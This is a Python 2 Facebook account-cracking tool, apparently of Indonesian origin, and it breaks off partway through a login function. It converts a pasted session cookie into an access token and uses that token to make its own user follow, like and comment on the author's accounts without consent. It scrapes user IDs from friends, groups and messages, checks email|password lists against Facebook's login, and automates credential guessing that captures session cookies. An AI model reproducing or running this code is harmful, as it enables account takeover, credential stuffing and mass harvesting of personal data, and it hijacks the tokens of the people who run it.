#!/usr/bin/python2
#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess,datetime
import requests,sys,random,time,re,base64,json
from multiprocessing.pool import ThreadPool
reload(sys)
sys.setdefaultencoding("utf-8")
""
# Recode Boleh Tapi Jangan Ubah
# Bot Komen Nya Faham Gk?
""
try:
    import requests
except ImportError:
    exit(' pip2 install requests *not installed')
try:
    import bs4
except ImportError:
    exit(' pip2 install bs4 *not installed')

logo = """
\x1b[37m  __  __ ____  _____
 |  \/  | __ )|  ___| *au : Ndrii-Sanz
 | |\/| |  _ \| |_        : O'Cafe
 | |  | | |_) |  _|       : Take Michi
 |_|  |_|____/|_|     : Yogzz Z Z
                                *fb : Ndrii Sanz
 [x]──────────────────────────────────────────[x]
"""
hostm="https://m.facebook.com"
uac = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' # Useragent Buat Dump
ua = 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF'
ua = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'
ip=requests.get("https://api.ipify.org").text.strip()
lok=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"}).json()["country_name"].lower()
url = 'https://mobile.facebook.com/login.php'
headersc = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36','Accept-Language' : 'en-US,en;q=0.5'}
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mbasic_h2={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
graph_h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
pantun = random.choice(["Langit biru terlihat sendu, Warna hijau biru dan semu, Jarak jauh tumbuhkan rindu, Ingin selalu dekat denganmu.",
"Beribu-ribu para pelukis, Hanya satu memakan roti. Beribu-ribu cewek yang manis, Hanya engkau di dalam hati.",
"Syair puisi pantun dan madah, Pujangga ciptakan sepenuh rasa. Engkau tetap yang terindah, Dalam hidupku sepanjang masa.",
"Api kecil dari tungku, Apinya kecil habis kayu. Sudah lama kutunggu-tunggu, Kapan kamu bilang I Love You.",
"Sebuah nama punya arti, Mencari nama berhati-hati. Biarlah aku bersedih hati, Untuk dia yang di hati.",
"Pagi-pagi minumnya jamu, Di depan rumah ada bakul tahu. Sedikit malu kukatakan padamu, Sungguh aku cinta kepadamu.",
"Buah salak baru dipetik, Buah duku buah delima. Ada banyak wanita cantik, Cuma kamu yang aku cinta.",
"Jika mau menanam tebu, Tanamlah di dekat pohon waru. Jika kamu cinta padaku, Bilang saja I love you.",
"Buah sirsak baru dipetik, Buah duku asam rasanya. Ada banyak gadis cantik, Hanya kamu yang aku cinta.",
"Ke Ciamis cari kopiah, Kopiah indah pasti kan didapati. Begitu banyak gadis yang singgah, Hanya kamu yang memikat hati.",
"Makan nasi pakai tahu, Minumnya pakai jus jambu. Janganlah kau jauh dariku, Aku akan selalu sayang padamu.",
"Jalan-jalan ke kota Prancis, Banyak rumah berbaris-baris. Biar mati di ujung keris, Asal dapat adinda yang manis.",
"Meski hanya buah jambu, Tapi ini bisa diramu. Meskipun jarang ketemu, Tapi cintaku hanya untukmu.",
"Aku sedang minum jamu, Minum di bawah pohon jambu. Aku tak mau kehilangan kamu, Karena ku sangat mencintaimu."])
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
# Boleh Di Tambahin Jangan Di Ganti #
def cek_login():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (' [x] Cookies Invalid')
		login()
	web = datetime.datetime.now()
	waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
	love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	kata = 'Pengguna Script MBF '
	kom = kata+love+'\n'+pantun+'\n'+waktu
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=Mantap Bang ❤️&access_token=' + toket)
        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + toket)
	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100041991180267/subscribers?access_token=' + toket)
	print (' [*] Login Berhasil')
	menu()
def cek_cookies():
	cvds=None
        new=None
        if cek(1)==False:
                try:
                        cookie=cvd(open("coki.log").read().strip())
                        cvds=cvd(cookie)
                        new=True
                except:
                        print(" [x] Cookies Invalid");login()
        else:
                cvds=cvd(open("coki.log").read().strip())
        r=requests.get("https://mbasic.facebook.com/profile.php",
                cookies=cvds,
        headers=hdcok()).text
        if len(bs4.re.findall("logout",r)) !=0:
		print(' [•] Mengecek Cookies')
		time.sleep(2)
                print(" [*] Selamat Datang : %s"%(
                        bs4.BeautifulSoup(r,
                "html.parser").find("title").text[0:10]))
		time.sleep(3)
		menu()
	else:
                try:
                        os.remove("coki.log")
                except:
                        pass
                print(" [*] Cookies Invalid");login()
def login():
    os.system('clear')
    print logo
    print(' [1] Login Menggunakan Cookies')
    print(' [2] Cara Mendapatkan Cookies')
    print(' [0] Keluar')
    lg = raw_input('\n [*] Input : ')
    if lg == '':
        os.sys.exit()
    elif lg == '1' or lg == '01':
        try:
		cookie = raw_input(" [*] Cookies : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36', # don't change this user agent.
                                'referer' : 'https://m.facebook.com/',
                                'host' : 'm.facebook.com',
                                'origin' : 'https://m.facebook.com',
                                'upgrade-insecure-requests' : '1',
                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                                'cache-control' : 'max-age=0',
                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                                 'cookie' : cookie }
                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
                cari = re.search('(EAAA\w+)', coki.text)
                hasil = cari.group(1)
                pup = open('coki.log', 'w')
                pup.write(cookie)
                pup.close()
                pip = open('login.txt', 'w')
                pip.write(hasil)
                pip.close()
                cek_login()
        except AttributeError:
                print ' [x] Cookies Salah'
                time.sleep(3)
                login()
        except UnboundLocalError:
                print ' [x] Cookies Salah'
                time.sleep(3)
                login()
        except requests.exceptions.SSLError:
                print ' [x] Tidak Ada Koneksi'
                exit()
    elif lg == '2' or lg == '02':
	jalan (' *Anda Akan Diarahkan Ke Browser')
	time.sleep(2)
	os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
	time.sleep(3)
	exit()
    elif lg == '0' or lg == '00':
        os.sys.exit()
    else:
        exit(' [x] Isi Dengan Benar')
def basecookie():
	if os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			return gets_dict_cookies(open('coki.log').read().strip())
		else:login()
	else:login()
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def hdcok():
	global hostm,uac
	hosts=hostm
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": uac, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
def menu():
  global ip
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nm = a['name']
    tll = a['birthday']
    month, day, year = tll.split("/")
    ttl = day+'/'+month+'/'+year
  except KeyError,IOError:
    print (" [x] Cookies Invalid")
    os.system('rm -rf login.txt')
    time.sleep(1)
    login()
  except requests.exceptions.ConnectionError:
    print (" [x] Tidak Ada Koneksi")
    exit()
  except Exception as e:
    print (' [x] Cookies Invalid')
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print (' [*] Nama : '+nm)
  print (' [*] Ip Address : '+ip)
  print (' [*] Tanggal Lahir : '+ttl)

  print ('\n [1] Dump ID Dari Cari Nama (Dump Slow)')
  print (' [2] Dump ID Dari Teman (Dump Fast)')
  print (' [3] Dump ID Dari Publik (Dump Fast/Slow)')
  print (' [4] Dump ID Dari Follower (Dump Fast)')
  print (' [5] Dump ID Dari Like (Dump Fast)')
  print (' [6] Dump ID Dari Grub (Dump Slow)')
  print (' [7] Dump ID Dari Pesan (Dump Slow)')
  print (' [8] Start Crack/Mulai Crack')
  print (' [9] Lihat Hasil Crack')
  print (' [A] Account Checker')
  print (' [0] Hapus Cookies\n')
  mn = raw_input(" [*] Input : ")
  if mn == "":
	print (' [x] Isi Dengan Benar')
	menu()
  elif mn == "1" or mn == '01':
    dumpfl()
    exit()
  elif mn == "2" or mn == '02':
    teman()
  elif mn =="3" or mn == '03':
    dfs = raw_input('\n [*] Dump Fast/Slow (f/s) : ')
    if dfs == '':
        menu()
    elif dfs == 'F' or dfs == 'f':
        publik()
    elif dfs == 'S' or dfs == 's':
        friendlist(basecookie())
    else:
	print (' [x] Isi Dengan Benar')
	menu()
  elif mn == "4" or mn == '04':
    follow()
  elif mn == "5" or mn == '05':
    like()
  elif mn == "6" or mn == '06':
    dump_grup(basecookie())
  elif mn == "7" or mn == '07':
    dump_message(basecookie())
  elif mn =="8" or mn == '08':
    metode()
  elif mn == "9" or mn == "09":
    print ('\n [1] Lihat Hasil Ok')
    print (' [2] Lihat Hasil Cp')
    print (' [0] Kembali\n')
    hs = raw_input(' [*] Input : ')
    if hs == '':
        menu()
    elif hs == '1' or hs == '01':
	ok()
    elif hs == '2' or hs == '02':
	cp()
    elif hs == '0' or hs == '00':
	menu()
    else:
	print (' [x] Isi Dengan Benar')
	menu()
  elif mn =="A" or mn == 'a':
    check_akun()
  elif mn == "0" or mn == '00':
    try:
      os.remove("login.txt")
      os.remove("coki.log")
      print (' [•] Berhasil Menghapus Cookies')
      os.sys.exit()
    except Exception as e:
	print (' [x] File Tidak Ada')
	os.sys.exit()
  else:
    print (' [x] Isi Dengan Benar')
    menu()
def check_akun():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(' [x] Cookies Invalid')
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	live = []
	cek = []
	die = []
	try:
		file = raw_input('\n [*] File Name : ')
		list = open(file,'r').readlines()
	except IOError:
		print (" [x] File Tidak Ada")
		raw_input(' {Kembali}')
		menu()
	pmsh = raw_input(' [*] Pemisah : ')
	print(' [*] Check Akun Sedang Berlangsung...\n')
	for yes in list:
		email, pw = (yes.strip()).split(str(pmsh))
		data = {'email': email,'pass': pw}
		xox = requests.post(url, headers=headersc, data=data).text
		if "xc_message" in xox:
			live.append(pw)
			print('\033[0;92m [Live] '+email+'|'+pw)
		elif "checkpointSubmitButton-actual-button" in xox:
			cek.append(pw)
			print('\033[0;93m [Check] '+email+'|'+pw)
		elif "login_error" in xox:
			die.append(pw)
			print('\033[0;91m [Die] '+email+'|'+pw)
		else:
			die.append(pw)
			print('\033[0;91m [Die] '+email+'|'+pw)
	print('\n\x1b[37m [Done] *Live : '+str(len(live))+' - *Check : '+str(len(cek))+' - *Die : '+str(len(die)))
	exit()
	menu()
def ok():
	try:
		ok=open('Ok.txt','r').read()
		print ok
	except KeyError,IOError:
                print (' [x] Hasil Ok Tidak Ada')
		os.sys.exit()
	except Exception as e:
	        print (' [x] Hasil Ok Tidak Ada')
	        os.sys.exit()
def cp():
        try:
                cp=open('Cp.txt','r').read()
                print cp
        except KeyError,IOError:
                print (' [x] Hasil Cp Tidak Ada')
                os.sys.exit()
	except Exception as e:
        	print (' [x] Hasil Cp Tidak Ada')
	        os.sys.exit()
def teman():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (' [x] Cookies Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		limit = '5000'
                file = raw_input("\n [*] Nama File : ")
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
                except KeyError:
			print (' [x] Tidak Ada Teman')
			raw_input(" {Kembali}")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('tmn.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r [*] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\n\n [*] Selesai")
		print(" [*] File Tersimpan : "+file)
		raw_input(" {Kembali}")
		menu()

        except requests.exceptions.ConnectionError:
		print (' [x] Tidak Ada Koneksi')
		os.sys.exit()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (' [x] Cookies Invalid')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		idt = raw_input(" [*] Profil ID : ")
		limit = '5000'
		file = raw_input(" [*] Nama File : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(" [*] Nama : "+op["name"])
		except KeyError:
			print(' [x] Profil ID Tidak Ada')
			raw_input(" {Kembali}")
			menu
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('pbk.txt').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r [*] Dump %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		os.rename(qq,file)
		print("\n\n [*] Selesai")
                print(" [*] File Dump Tersimpan : "+file)
                raw_input(" {Kembali}")
                menu()

	except Exception as e:
		print(' [x] Tidak Ada Teman')
		menu()
	except KeyError:
                print(' [x] Tidak Ada Teman')
                raw_input(' {Kembali}')
                menu()
def follow():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (' [x] Cookies Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
                idt = raw_input("\n [*] Profil ID : ")
                limit = '5000'
                file = raw_input(" [*] Nama File : ")
                try:
                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print(" [*] Nama : "+op["name"])
                except KeyError:
			print (' [*] ID Tidak Ditemukan')
			raw_input(" {Kembali}")
			menu()
                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
                id = []
                z=json.loads(r.text)
                qq = ('flw.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r [*] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\n\n [*] Selesai")
		print(" [*] File Dump Tersimpan : "+file)
		raw_input(" {Kembali}")
                menu()

        except KeyError:
		print(' [x] Tidak Ada Followers')
                raw_input(' {Kembali}')
                menu()
        except requests.exceptions.ConnectionError:
		print(' [x] Tidak Ada Koneksi')
		os.sys.exit()
def like():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print(' [x] Cookies Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
                idt = raw_input("\n [*] Post ID : ")
		limit = '5000'
                file = raw_input(" [*] Nama File : ")
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
                except KeyError:
			print (' [x] Post ID Tidak Ada')
			raw_input(" {Kembali}")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('lke.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r [*] Dump %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\n\n [*] Selesai")
		print(" [*] File Dump Tersimpan : "+file)
		raw_input(" {Kembali}")
		menu()

        except KeyError:
		print (' [x] Harus Berupa ID Postingan')
                raw_input(' {Kembali}')
                menu()
        except requests.exceptions.ConnectionError:
		print (' [x] Tidak Ada Koneksi')
		os.sys.exit()
class friendlist:

    def __init__(self, cookie):
        self.nitel = None
        self.cookie = cookie
	user = raw_input(" [*] Username : ")
        self.id = "https://www.facebook.com/"+user
        if self.id == '':
            friendlist(cookie)
        else:
            self.fl = raw_input(" [*] Nama File : ")
            open(self.fl, 'a+')
            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
            if len(id) == 0:
                friendlist(cookie)
            self.ok = bs4.re.sub(id, 'm.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
            self.dump(self.ok)
        return

    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
        if self.nitel == None:
            a = r.find('title').text[0:20]
            self.nitel = a
            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
            self.b = b
            print ' [*] Nama : %s' % a
        for i in r.find_all('a', href=True):
            if 'fref' in i.get('href'):
                print "\r [*] Dump %s/%s ID *type ctrl+z to stop" % (len(open(self.fl).read().splitlines()), self.b),;sys.stdout.flush();time.sleep(0.007)
                if 'profile_add_friend.php' in i.get('href'):
                    continue
                elif 'profile.php' in i.get('href'):
                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
                else:
                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
            if 'lihat teman lain' in i.text.lower():
                __import__('time').sleep(2)
                while True:
                    try:
                        self.dump('https://m.facebook.com/' + i.get('href'))
                        __import__('time').sleep(3)
                        break
                    except Exception as e:
                        print '\r [x] Dump Gagal %s' % e
                        continue
	print ('\n\n [*] Selesai')
	print (' [*] File Dump Tersimpan : '+self.fl)
	raw_input(" {Kembali}")
	menu()
        return
class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})

        if len(self.glist) != 0:
            print '\n [•] Anda Memiliki %s Grub' % len(self.glist)
            print ' [1] Dapatkan Grub Dari Cari Nama'
            print ' [2] Masukan ID Grub/Manual'
            while True:
                c = raw_input(' [*] Input : ')
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
                    print ' [x] Isi Dengan Benar'

        else:
            exit(' [x] Grub Tidak Ditemukan')

    def manual(self):
        id = raw_input(' [*] Grub ID : ')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit(' [x] Grub ID Tidak Valid/Anda Belum Bergabung Grub')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print ' [*] Nama Grub : %s' % self.listed.get('name')[0:20]
                self.dumps('https://m.facebook.com/groups/' + id)

    def search(self):
        whitelist = []
        q = raw_input(' [*] Input Grub Name : ').lower()
        if q == '':
            self.search()
        else:
            for e, i in enumerate(self.glist):
                if q in i.get('name').lower():
                    whitelist.append(i)
                    print '  [%s] %s' % (
                     len(whitelist),
                     i.get('name').lower().replace(q, '%s' % (q)))

            if len(whitelist) == 0:
                print ' [x] Tidak Ada Hasil Untuk Grub : %s' % q
                self.search()
            else:
                print ''
                self.choice(whitelist)

    def choice(self, whitelist):
        try:
            self.listed = whitelist[(input(' [*] Pilih Grub : ') - 1)]
            self.f()
            print ' [*] Nama : %s' % self.listed.get('name')
            self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
        except Exception as e:
            print ' [x] %s' % e
            self.choice(whitelist)

    def f(self):
        self.fl = raw_input(" [*] Nama File : ")
        if self.fl == '':
            self.fl()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print "\r [*] Dump %s ID *type ctrl+z to stop\r" % len(open(self.fl).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print '\r [x] %s, Mencoba Lagi' % e
                        continue

	print ('\n\n [*] Selesai')
	print (' [*] File Dump Tersimpan : '+self.fl)
	raw_input(" {Kembali}")
	menu()
class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input(" [*] Nama File : ")
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print "\r [*] Dump %s ID *type ctrl+z to stop" % len(open(self.f).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)

                except Exception as e:
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

	print ('\n\n [*] Selesai')
	print (' [*] File Dump Tersimpan : '+self.f)
	raw_input(" {Kembali}")
	menu()
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(requests.get(
		b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		print "\r [*] Dump %s ID"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))

		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print ('\n\n [*] Selesai')
	print (' [*] File Dump Tersimpan : '+fl)
	raw_input(" {Kembali}")
	menu()
def cek(arg):
	if os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			return True
		else:return False
	else:return False
def dumpfl():
	cvds=None
	new=None
	if cek(1)==False:
		try:
			cookie=cvd(open("coki.log").read().strip())
			cvds=cvd(cookie)
			new=True
		except:
			print(" [x] Cookies Invalid");login()
	else:
		cvds=cvd(open("coki.log").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		cookies=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		if new==True:
			open("coki.log","w").write(cookie)
		s=raw_input(" [*] Query : ")
		fl=raw_input(" [*] Nama File : ").replace(" ","_")
		search(
			fl,cvds,
		"https://m.facebook.com/search/people/?q="+s)
	else:
		try:
			os.remove("coki.log")
		except:
			pass
		print(" [x] Cookies Invalid");login()
def mfb(em,pas,hosts):
    global ua,mfb_h
    r = requests.Session()
    r.headers.update(mfb_h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
